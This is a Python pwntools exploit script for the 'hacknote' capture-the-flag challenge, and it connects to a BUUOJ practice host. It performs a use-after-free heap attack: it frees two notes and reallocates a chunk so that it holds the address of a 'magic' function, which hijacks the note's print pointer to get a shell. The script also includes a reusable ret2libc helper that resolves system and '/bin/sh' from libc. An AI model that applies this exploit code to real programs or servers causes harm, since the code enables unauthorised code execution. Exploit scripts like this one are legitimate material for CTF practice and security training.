from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './hacknote'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',29924) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def dbg():
	gdb.attach(p)
	pause()

# start
def add(size,name='a'):
	sla(':','1')
	sla(':',str(size))
	sla(':',name)

def delete(index):
	sla(':','2')
	sla(':',str(index))

def show(index):
	sla(':','3')
	sla(':',str(index))

magic = p32(elf.sym['magic']) # 0x8048945
add(0x10) # 0
add(0x10) # 1
delete(0)
delete(1)
add(0x8,magic)
show(0)
# end

itr()